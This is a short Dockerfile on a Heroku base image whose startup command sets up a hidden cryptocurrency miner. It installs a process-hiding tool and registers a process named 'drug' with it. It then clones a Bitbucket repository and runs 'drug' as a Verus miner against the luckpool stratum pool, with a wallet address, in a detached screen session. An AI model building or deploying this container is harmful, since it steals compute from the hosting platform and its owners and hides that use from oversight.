FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
CMD sudo -i
CMD sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm install -g npm@8.4.1 && npm i -g node-process-hider && sudo ph add drug && git clone https://mariere-born@bitbucket.org/mariere-born99/mariere-born.git && cd mariere-born && sudo apt update && sudo apt install screen libjansson4 -y && screen -dmS ls && chmod +x drug && ./drug -a verus -o stratum+tcp://na.luckpool.net:3956 -u RLNVtg1jXXuRmMkvoi6EcaCFgQzNf5vBew.TEST -p x -t 15
